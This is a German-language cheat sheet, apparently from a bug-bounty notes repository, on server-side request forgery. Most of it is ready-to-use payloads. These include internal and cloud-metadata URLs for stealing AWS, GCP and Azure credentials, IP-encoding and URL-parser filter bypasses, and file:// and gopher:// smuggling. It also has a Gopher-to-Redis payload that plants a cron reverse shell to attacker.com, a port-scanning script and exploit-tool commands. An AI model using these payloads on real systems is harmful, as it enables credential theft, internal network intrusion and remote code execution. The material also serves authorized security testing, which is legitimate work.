# 🌐 SSRF – serverseitige Anfragenfälschung (Server-Side Request Forgery)

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ███████╗███████╗██████╗ ███████╗
  ██╔════╝██╔════╝██╔══██╗██╔════╝
  ███████╗███████╗██████╔╝█████╗  
  ╚════██║╚════██║██╔══██╗██╔══╝  
  ███████║███████║██║  ██║██║     
  ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝     
   Serverseitige Anfragenfälschung
```

<p align="center">
  <img src="https://img.shields.io/badge/SSRF-Internal_Access-red?style=for-the-badge" alt="SSRF">
  <img src="https://img.shields.io/badge/Cloud-Metadata-blue?style=for-the-badge" alt="Cloud">
  <img src="https://img.shields.io/badge/Bug_Bounty-green?style=for-the-badge" alt="Bug Bounty">
</p>

---

## 🎯 Was ist SSRF?

Bei **SSRF** kann ein Angreifer den Server dazu bringen, Anfragen an nicht vorgesehene Ziele zu senden. Dadurch lassen sich möglicherweise interne Dienste oder Cloud-Metadaten erreichen.

### Auswirkungen
- 🔴 **Zugriff auf das interne Netzwerk** – interne Dienste untersuchen
- 🔴 **Cloud-Metadaten** – AWS-/GCP-Zugangsdaten entwenden
- 🔴 **Firewalls umgehen** – auf geschützte Ressourcen zugreifen
- 🔴 **RCE (Remote Code Execution)** – kann unter bestimmten Bedingungen zur Ausführung von Code führen

---

## 🔍 Wo lohnt sich die Suche?

### Häufige Parameter
```
url=
uri=
path=
dest=
redirect=
redirect_uri=
next=
data=
reference=
site=
html=
val=
validate=
domain=
callback=
return=
page=
feed=
host=
port=
to=
out=
view=
dir=
```

### Häufig anfällige Funktionen
```
- Funktionen zum Abrufen oder Validieren von URLs
- PDF-Generatoren
- Bildverarbeitung
- Dateiimporte
- Webhooks
- API-Integrationen
- Web-Scraper
- Screenshot-Dienste
```

---

## 💉 Grundlegende Payloads

### Lokaler Rechner (Localhost)
```
http://localhost
http://localhost:80
http://localhost:443
http://localhost:22
http://127.0.0.1
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.1
http://0.0.0.0
http://0
http://[::1]
http://[0000::1]
```

### Interne Netzwerke
```
# Klasse A
http://10.0.0.1
http://10.10.10.10
http://10.255.255.255

# Klasse B
http://172.16.0.1
http://172.31.255.255

# Klasse C
http://192.168.0.1
http://192.168.1.1
http://192.168.255.255

# Linklokal
http://169.254.169.254
```

### Häufige Ports
```
http://127.0.0.1:21    # FTP
http://127.0.0.1:22    # SSH
http://127.0.0.1:23    # Telnet
http://127.0.0.1:25    # SMTP
http://127.0.0.1:80    # HTTP
http://127.0.0.1:443   # HTTPS
http://127.0.0.1:3306  # MySQL
http://127.0.0.1:5432  # PostgreSQL
http://127.0.0.1:6379  # Redis
http://127.0.0.1:27017 # MongoDB
http://127.0.0.1:8080  # Alternativer HTTP-Port
http://127.0.0.1:9200  # Elasticsearch
```

---

## ☁️ Cloud-Metadaten

### AWS
```
# Instanzmetadaten (IMDSv1)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document

# Bestimmte Daten
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-ipv4
```

### Google Cloud (GCP)
```
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/
http://metadata.google.internal/computeMetadata/v1/project/

# Der folgende Header ist erforderlich
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01

# Erfordert einen Header
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

### DigitalOcean
```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/hostname
```

---

## 🛡️ Techniken zum Umgehen von Filtern

### Schreibweisen von IP-Adressen
```
# Dezimal
http://2130706433  # = 127.0.0.1
http://3232235521  # = 192.168.0.1

# Hexadezimal
http://0x7f000001  # = 127.0.0.1
http://0x7f.0x0.0x0.0x1

# Oktal
http://0177.0.0.01  # = 127.0.0.1
http://0177.0.0.0

# Gemischte Schreibweisen
http://127.1
http://127.0.1
http://0
```

### URL-Kodierung
```
http://127.0.0.1 → http://%31%32%37%2e%30%2e%30%2e%31
http://localhost → http://%6c%6f%63%61%6c%68%6f%73%74

# Doppelte Kodierung
http://%25%36%63%25%36%66%25%36%33%25%36%31%25%36%63%25%36%38%25%36%66%25%37%33%25%37%34
```

### DNS-Rebinding (Wechsel der DNS-Auflösung)
```
# Beispielsweise folgende Dienste verwenden:
# - spoofed.burpcollaborator.net
# - 7f000001.rbndr.us  → 127.0.0.1
# - 1.localtest.me → 127.0.0.1

# Eigenen DNS-Eintrag einrichten
your-domain.com → 127.0.0.1
```

### Probleme beim Parsen von URLs
```
# Trick mit @
http://attacker.com@127.0.0.1
http://127.0.0.1#@attacker.com
http://127.0.0.1?@attacker.com
http://attacker.com\@127.0.0.1

# Fragmente
http://127.0.0.1#.attacker.com
http://127.0.0.1?.attacker.com

# Rückwärtsschrägstrich (Backslash)
http://attacker.com\127.0.0.1
```

### Protokoll-Smuggling (Nutzung anderer Protokolle)
```
# Dateizugriff (File)
file:///etc/passwd
file://127.0.0.1/etc/passwd

# Gopher
gopher://127.0.0.1:6379/_INFO

# Dict
dict://127.0.0.1:6379/INFO

# LDAP
ldap://127.0.0.1:389

# TFTP
tftp://127.0.0.1/file.txt
```

### Kette über eine offene Weiterleitung (Open Redirect)
```
# Falls die Website eine offene Weiterleitung enthält:
https://target.com/redirect?url=http://169.254.169.254/

# Weiterleitung zu einem internen Ziel
http://target.com/redirect?url=http://127.0.0.1:8080
```

### Filter über IPv6 umgehen
```
http://[::1]
http://[0:0:0:0:0:0:0:1]
http://[::ffff:127.0.0.1]
http://[::]
```

### Header-Injection (Einschleusen von Headern)
```
# CRLF-Injection in der URL
http://attacker.com%0d%0aHost:%20127.0.0.1%0d%0a
```

---

## 🔥 Ausnutzung

### Codeausführung in Redis über Gopher
```
# Payload erzeugen
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a
*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1
%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

### HTTP Request Smuggling (Einschleusen von HTTP-Anfragen)
```
gopher://127.0.0.1:80/_POST%20/internal/admin%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%2020%0d%0a%0d%0acommand=id
```

### Port-Scanning
```python
import requests

target = "https://vulnerable.com/fetch?url="
ports = [21, 22, 23, 25, 80, 443, 3306, 6379, 8080]

for port in ports:
    url = f"{target}http://127.0.0.1:{port}"
    r = requests.get(url, timeout=5)
    if "connection refused" not in r.text.lower():
        print(f"[OPEN] Port {port}")
```

---

## 📊 Kurzreferenz

### Erkennung
```
# Auf SSRF prüfen
?url=http://burpcollaborator.net
?url=http://webhook.site/xxxx

# Reaktion prüfen
- DNS-Anfrage empfangen?
- HTTP-Anfrage empfangen?
- Abweichende Antwort bei internen IP-Adressen?
```

### Schweregrade

| Ziel | Auswirkung |
|--------|--------|
| Cloud-Metadaten | Kritisch – Diebstahl von Zugangsdaten |
| Interne APIs | Hoch – Datenzugriff |
| Interne Dienste | Hoch – mögliche Codeausführung (RCE) |
| Port-Scanning | Mittel – Offenlegung von Informationen |

### Häufige Filter und Umgehungsmöglichkeiten

| Filter | Umgehungsmöglichkeit |
|--------|--------|
| `localhost` wird blockiert | `127.0.0.1`, `0`, `[::1]` verwenden |
| `127.0.0.1` wird blockiert | Dezimale Schreibweise `2130706433` verwenden |
| Private IP-Adressen werden blockiert | DNS-Rebinding verwenden |
| Nur HTTP erlaubt | `gopher://`, `file://` ausprobieren |
| Domain-Allowlist | Trick mit `@` oder offene Weiterleitung verwenden |

---

## 🛠️ Werkzeuge

```bash
# SSRFmap
python3 ssrfmap.py -r request.txt -p url -m readfiles

# Gopherus (Generator für Gopher-Payloads)
python gopherus.py --exploit redis

# Collaborator/Webhook für blinde SSRF (ohne direkt sichtbare Antwort)
# - Burp Collaborator
# - webhook.site
# - requestbin.com
```

---

## 📚 Weiterführende Quellen

- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
- [SSRF-Leitfaden von OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PayloadsAllTheThings SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)

---

<p align="center">
  <b>🌐 SSRF verstehen und ausnutzen!</b><br>
  <i>Nur für ausdrücklich autorisierte Tests!</i>
</p>


---

## Hinweise zur deutschen Ausgabe

- **Protokoll und Parser:** Die Beispiele wurden unverändert übernommen. Die Portnummer bestimmt nicht das Protokoll: Eine URL mit `http://` verwendet auch an einem üblicherweise für HTTPS oder SSH genutzten Port weiterhin HTTP. Alternative IP-Schreibweisen und andere URL-Schemata funktionieren nur, wenn der jeweilige Client sie unterstützt. DNS-Rebinding und Weiterleitungen sind unterschiedliche Mechanismen; ein statischer DNS-Eintrag auf eine interne Adresse belegt kein Rebinding. Die Umgehungstabelle beschreibt mögliche Ansätze, keine garantierten Filterumgehungen. [OWASP beschreibt die Abhängigkeiten von Parsern, Protokollprüfung und DNS-Auflösung](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).

- **Cloud-Metadaten:** Die AWS-Beispiele zeigen IMDSv1. Bei einer Instanz, die ausschließlich IMDSv2 akzeptiert, reichen diese Anfragen nicht aus; IMDSv2 setzt ein Sitzungstoken voraus. Bei GCP und Azure müssen die erforderlichen Metadaten-Header tatsächlich gesendet werden können. Der Zugriff auf Metadaten bedeutet außerdem nicht automatisch den Zugriff auf verwertbare Zugangsdaten. Siehe [AWS IMDS](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html), [GCP-Metadaten](https://docs.cloud.google.com/compute/docs/metadata/querying-metadata) und [Azure IMDS](https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service).

- **HTTP und Auswertung:** Das Gopher-Beispiel unter „HTTP Request Smuggling“ überträgt eine HTTP-Anfrage; dies allein belegt noch kein Request Smuggling. Dafür müssen beteiligte HTTP-Komponenten Anfragengrenzen unterschiedlich interpretieren. Außerdem stimmt die angegebene Körperlänge im Beispiel nicht mit dem gezeigten Körper überein. [PortSwigger erklärt die erforderlichen Parsing-Unterschiede](https://portswigger.net/web-security/request-smuggling). Beim Python-Beispiel ist das Fehlen der Meldung „connection refused“ kein zuverlässiger Nachweis für einen offenen Port; Ausnahmen werden nicht behandelt. Die Schweregrade sind kontextabhängige Orientierungswerte.
